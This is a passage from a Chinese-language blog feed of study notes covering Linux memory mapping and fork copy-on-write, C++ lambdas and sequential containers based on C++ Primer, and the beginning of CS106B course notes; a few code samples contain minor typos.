    <content type="html"><![CDATA[<p>内存映射分为普通文件和匿名文件，这里讨论的是Linux环境</p><h2 id="文件映射file-mapping">文件映射（File Mapping）</h2><h3 id="普通文件">普通文件</h3><p>将<strong>普通磁盘文件</strong>的某个区域映射到进程的虚拟内存空间。</p><h4 id="工作原理">工作原理</h4><ul><li><strong>页面划分</strong>：文件内容被划分成页面大小（通常为4KB）的片段，每个片段对应虚拟内存中的一个页面。</li><li>按需加载（Demand Paging）：<ul><li>初始时，文件内容并不会全部加载到物理内存中。</li><li>当CPU<strong>首次</strong>访问某个虚拟页面时，操作系统才将文件对应的页面<strong>从磁盘加载到物理内存</strong>。</li></ul></li><li><strong>超出文件区域</strong>：若映射区域大于文件大小，超出部分会被<strong>零填充</strong>（Paddingwith zeros）。</li></ul><h4 id="特点">特点</h4><ul><li>文件的内容直接与虚拟内存对应，可进行高效的文件I/O操作。</li><li>用于<strong>程序执行</strong>（如加载可执行文件）或实现<strong>文件共享</strong>。</li></ul><h3 id="匿名文件">匿名文件</h3><p>将一片<strong>不关联磁盘文件</strong>的内存区域映射到进程的虚拟地址空间。这种区域内容初始化为<strong>全零</strong>，由内核创建的<strong>匿名文件</strong>管理。匿名文件的内容全部由<strong>二进制零</strong>组成，因此它是<strong>空白的</strong>、未初始化的。</p><h4 id="工作原理-1">工作原理</h4><ul><li>按需分配：<ul><li>初始时，匿名映射区域并不占用物理内存。</li><li>当CPU首次访问某个虚拟页面时，内核会分配一个<strong>物理页面</strong>，并将其内容填充为<strong>二进制零</strong>。</li></ul></li><li>只有当CPU第一次访问某个虚拟页面时（即“触摸”该页面），内核才会进行以下操作：<ol type="1"><li><strong>选择一个牺牲页面</strong>（VictimPage）：从物理内存中找到一个适合被替换的页面。</li><li><strong>交换脏页面</strong>（如有必要）：如果选中的页面是<strong>脏页面</strong>（内容被修改过但尚未写回磁盘），内核会先将其内容写回磁盘。</li><li><strong>填充零值</strong>：内核将物理页面的内容全部填充为<strong>二进制零</strong>。</li><li><strong>更新页表</strong>：内核将虚拟页面与新分配的物理页面关联起来，并将页面标记为<strong>已驻留</strong>（Resident）。</li></ol></li></ul><h4 id="特点-1">特点</h4><ul><li>适用于分配需要初始化为零的内存区域，例如堆内存、栈内存。</li><li>不涉及磁盘文件，因此无需磁盘I/O。</li><li>由于这种机制不会涉及磁盘和内存之间的数据传输，内核只是在分配物理页面时填充零值，因此这类页面被称为<strong>需求零页面</strong>（Demand-ZeroPages）。</li></ul><h2 id="fork-函数">fork 函数</h2><p><strong>1. 调用 <code>fork()</code> 时的内存复制：</strong></p><ul><li><p>在调用 <code>fork()</code>时，操作系统并不会立即复制整个父进程的内存空间，而是通过<strong>写时复制（Copy-On-Write,COW）机制</strong>优化内存使用。</p><blockquote><p><strong>写时复制</strong>只有在任⼀进程（⽗进程或⼦进程）对数据执⾏了写操作时，复制才会发⽣（先是缺⻚中断，然后操作系统给⼦进程分配内存并复制⽗进程的数据）</p></blockquote></li><li><p>父子进程会<strong>共享同一块物理内存页面</strong>（只读）。</p></li><li><p>只有当父进程或子进程尝试修改内存时，写时复制机制会为对应的进程创建一个新页面，从而为每个进程保持了私有地址空间的抽象概念。</p></li></ul><p><strong>2. 创建子进程：</strong></p><ul><li>内核会为子进程分配一个新的<strong>进程控制块（PCB）</strong>，用于存储子进程的状态信息。</li><li>子进程获得与父进程相同的内存空间（通过 COW 实现共享）。</li><li>子进程会继承父进程的大部分资源，例如：<ul><li>程序代码（代码段）</li><li>堆、栈（通过 COW 共享）</li><li>打开的文件描述符</li><li>环境变量等</li></ul></li></ul><p><strong>3. 返回值不同：</strong></p><ul><li><code>fork()</code>在父进程和子进程中都会返回：<ul><li>在<strong>父进程</strong>中，<code>fork()</code>返回<strong>子进程的PID</strong>。</li><li>在<strong>子进程</strong>中，<code>fork()</code>返回<strong>0</strong>。</li><li>如果 <code>fork()</code> 失败，返回<strong>-1</strong>，表示子进程创建失败。</li></ul></li></ul><p>通过返回值的不同，程序可以判断当前正在运行的是父进程还是子进程。</p><p><strong>4. 进程调度：</strong></p><ul><li>父进程和子进程会被操作系统调度器视为两个独立的进程，独立运行。</li><li>由于父子进程共享同一个代码段，它们可以执行不同的代码路径（如通过<code>if</code> 判断 <code>fork()</code> 返回值）。</li></ul>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lambda表达式</title>
    <link href="/2024/12/02/lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2024/12/02/lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<p>内容参考《C++ primer》</p><h2 id="定义">定义</h2><ul><li><p>一个lambda表达式表示一个可调用的代码单元。我们可以将其理解为一个未命名的内联函数。</p></li><li><p>表达式形式</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[capture list](parameter list) -&gt; return type { function body }</span><br></pre></td></tr></tbody></table></figure><blockquote><p>lambda表达式必须使用尾置返回，尾置返回示例如下：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// func接受一个int类型的实参，返回一个指针，该指针指向含有10个整数的数组</span></span><br><span class="line"><span class="function"><span class="keyword">auto</span> <span class="title">func</span><span class="params">(<span class="type">int</span> i)</span> -&gt; <span class="title">int</span><span class="params">(*)</span>[10]</span>;</span><br></pre></td></tr></tbody></table></figure></blockquote></li><li><p>若忽略括号和参数列表，则等价于指定一个空参数列表</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> f = [] { <span class="keyword">return</span> <span class="number">42</span>; };</span><br><span class="line">cout &lt;&lt; <span class="built_in">f</span>() &lt;&lt; endl; <span class="comment">//打印42</span></span><br></pre></td></tr></tbody></table></figure></li></ul><h3 id="向lambda传递参数">向lambda传递参数</h3><ul><li><p>包含参数的lambda表达式，可作为<code>find_if</code>函数的一个参数</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[](<span class="type">const</span> string &amp;a, <span class="type">const</span> string &amp;b) { <span class="keyword">return</span> a.<span class="built_in">size</span>() &lt; b.<span class="built_in">size</span>(); }</span><br></pre></td></tr></tbody></table></figure></li></ul><h3 id="使用捕获列表">使用捕获列表</h3><ul><li><p>lambda表达式通过将局部变量包含在其捕获列表中来指出将会使用这些变量。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[sz](<span class="type">const</span> string &amp;a) { <span class="keyword">return</span> a.<span class="built_in">size</span>() &gt;= sz; };</span><br></pre></td></tr></tbody></table></figure></li></ul><h2 id="变量的捕获方式">变量的捕获方式</h2><h3 id="值捕获">值捕获</h3><ul><li>lambda采用值捕获的方式。与传值参数类似，采用值捕获的前提是变量可以拷贝。</li><li>与参数不同，被捕获的变量的值是在lambda创建时拷贝，而不是调用时拷贝</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">fcn1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="type">size_t</span> v1 = <span class="number">42</span>; <span class="comment">//局部变量</span></span><br><span class="line"><span class="comment">//将v1拷贝到名为f的可调用对象</span></span><br><span class="line"><span class="keyword">auto</span> f = [v1]{ <span class="keyword">return</span> v1; };</span><br><span class="line">v1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">auto</span> j = <span class="built_in">f</span>(); <span class="comment">// j 为 42，f保存了我们创建它时v1的拷贝</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="引用捕获">引用捕获</h3><ul><li>v1之前的<code>&amp;</code>指出v1应该以引用方式捕获。</li><li>当我们在lambda函数体内使用此变量时，实际上使用的是引用所绑定的对象。</li><li>在本例中，当lambda返回v1时，它返回的是v1指向的对象的值。</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">fcn1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line"><span class="type">size_t</span> v1 = <span class="number">42</span>; <span class="comment">//局部变量</span></span><br><span class="line"><span class="comment">// f包含对v1的引用</span></span><br><span class="line"><span class="keyword">auto</span> f = [&amp;v1]{ <span class="keyword">return</span> v1; };</span><br><span class="line">v1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">auto</span> j = <span class="built_in">f</span>(); <span class="comment">// j 为 0，f保存了v1的引用</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="隐式捕获">隐式捕获</h3><ul><li>让编译器根据lambda体中的代码来推断我们要使用哪些变量</li><li><code>&amp;</code>告诉编译器采用捕获引用方式，<code>=</code>则表示采用值捕获方式</li><li>混合使用隐式捕获和显式捕获时，显式捕获的变量必须使用与隐式捕获不同的方式。</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sz为隐式捕获，值捕获方式，这里的lambda表达式是find_if的第三个参数</span></span><br><span class="line">wc = <span class="built_in">find_if</span>(words.<span class="built_in">begin</span>(),words.<span class="built_in">end</span>(), </span><br><span class="line">             [=](<span class="type">const</span> string &amp;s)</span><br><span class="line">                { <span class="keyword">return</span> s.<span class="built_in">size</span>() &gt;= sz; });</span><br></pre></td></tr></tbody></table></figure><h2 id="可变lambda">可变lambda</h2><ul><li><p>对于一个值被拷贝的变量，若要改变一个被捕获的变量的值，就必须在参数列表首加上关键字mutable</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">fen3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="type">size_t</span> v1 = <span class="number">42</span>;<span class="comment">//局部变量</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="comment">// f可以改变它所捕获的变量的值</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">auto</span> f = [v1] ()  <span class="keyword">mutable</span> { <span class="keyword">return</span> ++v1;};</span></span></span><br><span class="line"><span class="params"><span class="function">v1 =<span class="number">0</span>;</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">auto</span> j = f();<span class="comment">//j为43</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></tbody></table></figure></li><li><p>对于引用捕获的变量可以直接修改，不用添加mutable关键字</p></li></ul><h2 id="指定返回类型">指定返回类型</h2><ul><li><p>默认情况下，如果一个lambda体包含<code>return</code>之外的任何语句，则编译器假定此lambda返回void。例如下面的代码就是错误的</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//错误：不能推断lambda的返回类型</span></span><br><span class="line"><span class="built_in">transform</span>(vi.<span class="built_in">begin</span>(), vi.<span class="built_in">end</span>(), vi.<span class="built_in">begin</span>(),</span><br><span class="line">          [](<span class="type">int</span> i)</span><br><span class="line">            { <span class="keyword">if</span>(i&lt;<span class="number">0</span>) <span class="keyword">return</span> -i; <span class="keyword">else</span> <span class="keyword">return</span> i;};</span><br></pre></td></tr></tbody></table></figure></li><li><p>若lambda表达式包含其他语句，且返回值其实不是void，则使用尾置返回类型</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">transform</span>(vi.<span class="built_in">begin</span>(), vi.<span class="built_in">end</span>(), vi.<span class="built_in">begin</span>(),</span><br><span class="line">          [](<span class="type">int</span> i) -&gt; <span class="type">int</span>  <span class="comment">// 这里指定了返回类型</span></span><br><span class="line">            { <span class="keyword">if</span>(i&lt;<span class="number">0</span>) <span class="keyword">return</span> -i; <span class="keyword">else</span> <span class="keyword">return</span> i; });</span><br></pre></td></tr></tbody></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>CPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>顺序容器</title>
    <link href="/2024/11/20/%E9%A1%BA%E5%BA%8F%E5%AE%B9%E5%99%A8/"/>
    <url>/2024/11/20/%E9%A1%BA%E5%BA%8F%E5%AE%B9%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p>内容参考《C++ primer》</p><p>遇到具体的容器操作可以查看https://zh.cppreference.com/w/cpp</p><h2 id="顺序容器类型">顺序容器类型</h2><p><code>vector</code>、<code>deque</code>、<code>list</code>、<code>forward_list</code>、<code>array</code>、<code>string</code></p><ul><li><code>string</code>和<code>vector</code>将元素保存在连续的内存空间中。在这两种容器的中间位置添加或删除元素就会非常耗时——需要移动插入/删除位置之后的所有元素</li><li><code>list</code>和<code>forward_list</code>两个容器的设计目的是令容器任何位置的添加和删除操作都很快速。但是这两个容器不支持元素的随机访问。</li><li><code>deque</code>（双端队列）支持随机访问，在其两端添加或删除元素都是很快的</li><li><code>array</code>对象的大小是固定的。因此，<code>array</code>不支持添加和删除元素以及改变容器大小的操作</li><li>顺序容器是可以嵌套的，例如：<code>vector&lt;vector&lt;string&gt;&gt; lines;</code></li></ul><h2 id="定义和初始化">定义和初始化</h2><h3 id="拷贝初始化">拷贝初始化</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; ivec; <span class="comment">//初始状态为空</span></span><br><span class="line"><span class="comment">//在此处给ivec添加一些值</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ivec2</span><span class="params">(ivec)</span></span>; <span class="comment">//把ivec的元素拷贝给ivec2</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; ivec3 = ivec; <span class="comment">//把ivec的元素拷贝给ivec3</span></span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">it</span><span class="params">(b, e)</span></span>; <span class="comment">//it初始化为迭代器b和e指定范围中的元素的拷贝。</span></span><br></pre></td></tr></tbody></table></figure><h3 id="列表初始化">列表初始化</h3><p>使用花括号初始化元素值</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;string&gt; <span class="title">vl</span><span class="params">(<span class="string">"a"</span>,<span class="string">"an"</span>,<span class="string">"the"</span>};<span class="comment">//列表初始化</span></span></span></span><br><span class="line"><span class="params"><span class="function">vector&lt;string&gt; v1 = {<span class="string">"a"</span>, <span class="string">"an"</span>, <span class="string">"the"</span>}; </span></span></span><br></pre></td></tr></tbody></table></figure><h3 id="创建指定数量的元素">创建指定数量的元素</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ivec</span><span class="params">(<span class="number">10</span>,<span class="number">-1</span>)</span></span>; <span class="comment">//10个int类型的元素，每个都被初始化为-1</span></span><br><span class="line"><span class="function">vector&lt;string&gt; <span class="title">svec</span><span class="params">(<span class="number">10</span>,<span class="string">"hi!"</span>)</span></span>;<span class="comment">// 10个string类型的元素，每个都被初始化为"hi!"</span></span><br></pre></td></tr></tbody></table></figure><h3 id="值初始化">值初始化</h3><p>只提供容器容纳的元素数量</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ivec</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">// 10个元素，每个都初始化为0</span></span><br><span class="line"><span class="function">vector&lt;string&gt; <span class="title">svec</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">// 10个元素，每个都是空string对象</span></span><br></pre></td></tr></tbody></table></figure><h3 id="array">array</h3><ul><li><p>使用该类型时，<strong>必须</strong>指明元素类型和<strong>大小</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array&lt;<span class="type">int</span>, 10&gt; a1;</span><br></pre></td></tr></tbody></table></figure></li><li><p>数组类型不能进行拷贝或对象赋值操作，但是<code>array</code>类型可以</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> digs[<span class="number">10</span>]=(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>};</span><br><span class="line"><span class="type">int</span> cpy[<span class="number">10</span>] = digs;<span class="comment">//错误：内置数组不支持拷贝或赋值</span></span><br><span class="line">              </span><br><span class="line">array&lt;<span class="type">int</span>,<span class="number">10</span>&gt; digits-(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>};</span><br><span class="line">array&lt;<span class="type">int</span>,<span class="number">10</span>&gt; copy = digits;<span class="comment">//正确：只要数组类型和大小匹配即合法</span></span><br></pre></td></tr></tbody></table></figure></li></ul><blockquote><p>注意区别</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v1</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">// v1有10个元素，每个的值都是0</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v2{<span class="number">10</span>}; <span class="comment">// v2有1个元素，该元素的值是10</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v3</span><span class="params">(<span class="number">10</span>,<span class="number">1</span>)</span></span>; <span class="comment">// v3有10个元素，每个的值都是1</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; v4{<span class="number">10</span>,<span class="number">1</span>); <span class="comment">// v4有2个元素，值分别是10和1</span></span><br><span class="line"><span class="function">vector&lt;string&gt; <span class="title">v5</span><span class="params">(<span class="string">"hi"</span>};<span class="comment">//列表初始化：v5有一个元素</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="comment">// vector&lt;string&gt; v6("hi"); 错误：不能使用字符串字面值构建vector对象</span></span></span></span><br><span class="line"><span class="params"><span class="function">vector&lt;string&gt; v7(<span class="number">10</span>}; <span class="comment">// v7有10个默认初始化的元素</span></span></span></span><br><span class="line"><span class="params"><span class="function">vector&lt;string&gt; v8(<span class="number">10</span>,<span class="string">"hi"</span>}; <span class="comment">// v8有10个值为"hi"的元素</span></span></span></span><br></pre></td></tr></tbody></table></figure></blockquote><h2 id="赋值">赋值</h2><h3 id="直接赋值">直接赋值</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">v1 = v2;</span><br><span class="line">v = {a, b, c ...}; <span class="comment">// 初始化列表赋值，不适用于array</span></span><br></pre></td></tr></tbody></table></figure><h3 id="swap">swap</h3><ul><li>两个容器的大小不同也可以使用</li><li>例如，假定iter在swap之前指向svec1[3]的元素，那么在swap之后它指向svec2[3]的元素。与其他容器不同，对一个string调用swap会导致迭代器、引用和指针失效。</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">swap</span>(v1, v2); </span><br><span class="line">v1.<span class="built_in">swap</span>(v2);<span class="comment">// 交换v1和v2的值，速度比直接赋值快</span></span><br></pre></td></tr></tbody></table></figure><h3 id="assign">assign</h3><p><code>assign</code>操作不适用于关联容器和<code>array</code></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">seq.<span class="built_in">assign</span>(b, e); <span class="comment">// 将seq中的元素替换为迭代器b和e所表示的范围中的元素。迭代器b和e不能指向seq中的元素</span></span><br><span class="line">seq.<span class="built_in">assign</span>(il); <span class="comment">// 将seq中的元素替换为初始化列表il中的元素</span></span><br><span class="line">seq.<span class="built_in">assign</span>(n, t); <span class="comment">// 将seq中的元素替换为n个值为t的元素</span></span><br></pre></td></tr></tbody></table></figure><h2 id="关系运算">关系运算</h2><p><code>==</code>、<code>!=</code>、<code>&lt;</code>、<code>&gt;</code>、<code>&gt;=</code>、<code>&lt;=</code></p><ul><li>如果两个容器具有相同大小且所有元素都两两对应相等，则这两个容器相等；否则两个容器不等。</li><li>如果两个容器大小不同，但较小容器中每个元素都等于较大容器中的对应元素，则较小容器小于较大容器。</li><li>如果两个容器都不是另一个容器的前缀子序列，则它们的比较结果取决于第一个不相等的元素的比较结果。</li></ul><h2 id="迭代器">迭代器</h2><p>迭代器范围由一对迭代器组成，分别是<code>begin</code>和<code>end</code>，<code>begin</code>指向第一个元素，<code>end</code>指向最后一个元素之后的位置，所以元素所在的区间范围是左闭右开的<code>[begin, end)</code></p><h3 id="迭代器运算">迭代器运算</h3><ul><li><code>*iter</code> ：返回迭代器所指元素的引用</li><li><code>++iter</code>：令迭代器指向下一个元素</li><li><code>--iter</code>：令迭代器指向上一个元素</li><li><code>iter1 == iter2</code>或<code>iter1 != iter2</code>：判断两个迭代器是否相等</li></ul><h3 id="迭代器类型">迭代器类型</h3><p>分为<code>iterator</code>和<code>const_iterator</code>来表示。</p><ul><li><code>const_iterator</code>和常量指针差不多，能读取但<strong>不能修改</strong>它所指的元素值。</li><li><code>iterator</code>的对象可读可写。</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt;::iterator it;    <span class="comment">// it能读写vector&lt;int&gt;的元素</span></span><br><span class="line">string::iterator it2; <span class="comment">// it2能读写string对象中的字符</span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt;::const_iterator it3;<span class="comment">// it3只能读元素，不能写元素</span></span><br><span class="line">string::const_iterator it4; <span class="comment">// it4只能读字符，不能写字符</span></span><br></pre></td></tr></tbody></table></figure><p>一般使用<code>auto</code>声明迭代器，例如<code>auto it = a.begin()</code></p><h2 id="下标访问元素">下标访问元素</h2><p>我们希望确保下标是合法的，可以使用<code>at</code>成员函数。如果下标越界，<code>at</code>会抛出一个<code>out_of_range</code>异常</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;string&gt; svec;<span class="comment">//空vector</span></span><br><span class="line">cout &lt;&lt; svec[<span class="number">0</span>];<span class="comment">//运行时错误：svec中没有元素!</span></span><br><span class="line">cout &lt;&lt; svec.<span class="built_in">at</span>(<span class="number">0</span>);<span class="comment">//抛出一个out_of_range异常</span></span><br></pre></td></tr></tbody></table></figure><h2 id="改变容器大小">改变容器大小</h2><ul><li>使用<code>resize(new_size)</code>修改容器大小</li><li>注意<code>array</code>不支持修改容器大小</li><li>若要增大容器，则会在容器末尾添加</li><li>若要缩小容器，则会删去末尾元素</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">list&lt;<span class="type">int</span>&gt; <span class="title">ilist</span><span class="params">(<span class="number">10</span>,<span class="number">42</span>)</span></span>;<span class="comment">// 10个int:每个的值都是42</span></span><br><span class="line">ilist.<span class="built_in">resize</span>(<span class="number">15</span>);<span class="comment">//将5个值为0的元素添加到ilist的末尾</span></span><br><span class="line">ilist.<span class="built_in">resize</span>(<span class="number">25</span>,<span class="number">-1</span>);<span class="comment">//将10个值为-1的元素添加到ilist的末尾</span></span><br><span class="line">ilist.<span class="built_in">resize</span>(<span class="number">5</span>);<span class="comment">//从ilist末尾删除20个元素</span></span><br></pre></td></tr></tbody></table></figure><h2 id="适配器">适配器</h2><p>这里介绍顺序容器适配器：<code>stack</code>、<code>queue</code>和<code>priority_queue</code>。适配器(adaptor)是标准库中的一个通用概念。容器、迭代器和函数都有适配器。本质上，一个适配器是一种机制。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stack&lt;string, vector&lt;string&gt;&gt; str_stk; </span><br><span class="line"><span class="comment">//此声明的作用是创建一个以 vector&lt;string&gt; 为底层存储容器的堆栈，堆栈中的每个元素都是一个 string</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>注意要<strong>根据不同适配器的特性重载其默认容器类型</strong>，例如，<code>stack</code>只要求<code>push_back</code>、<code>pop_back</code>和<code>back</code>操作，因此可以使用除<code>array</code>和<code>forward_list</code>之外的任何容器类型来构造<code>stack</code>。<code>queue</code>适配器要求<code>back</code>、<code>push_back</code>、<code>front</code>和<code>push_front</code>，因此它可以构造于<code>list</code>或<code>deque</code>之上，但不能基于<code>vector</code>构造。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS106B-22Winter</title>
    <link href="/2024/10/26/CS106B/"/>
    <url>/2024/10/26/CS106B/</url>
    
    <content type="html"><![CDATA[<p>参考资料：</p><p>https://www.zhihu.com/column/c_1471256108476461057（实验环境配置/实验代码）</p><p>https://web.stanford.edu/class/archive/cs/cs106b/cs106b.1224/schedule.html#（教学安排）</p><p><a href="https://web.stanford.edu/dept/cs_edu/resources/cslib_docs/">StanfordC++ Library Documentation</a></p><p>https://web.stanford.edu/class/cs106x/res/reader/CS106BX-Reader.pdf（教材）</p><h2 id="chapter-1">Chapter 1</h2><h3 id="library-inclusions">library inclusions</h3><p>通过<code>#include</code>从对应头文件中读取相关定义，<code>&lt;iostream&gt;</code>中的尖括号表示这是一个系统库，也可以使用自己编写的头文件，则不包含尖括号而是以<code>.h</code>结尾。</p><h3 id="namespaces">namespaces</h3><p>不同的库或模块可能会定义相同的名称，举个例子，如果一个第三方库定义了一个函数叫“cout”，而你在代码中也使用了标准库的<code>std::cout</code>，为了避免这种情况，C++的命名空间设计允许你将不同的代码片段放在各自的命名空间中，这样就算名称相同，也不会冲突，例如：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> mylib {</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">cout</span><span class="params">()</span> </span>{</span><br><span class="line">        std::cout &lt;&lt; <span class="string">"This is mylib's cout!"</span> &lt;&lt; std::endl;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    std::cout &lt;&lt; <span class="string">"This is standard cout!"</span> &lt;&lt; std::endl;  <span class="comment">// std 命名空间中的 cout</span></span><br><span class="line">    mylib::<span class="built_in">cout</span>();  <span class="comment">// mylib 命名空间中的 cout</span></span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>可以使用<code>using namespace std;</code>将该命令空间中的所有成员加入当前域，因此就不用添加namespace前缀了，但是这个功能在大项目中要慎用。</p><h3 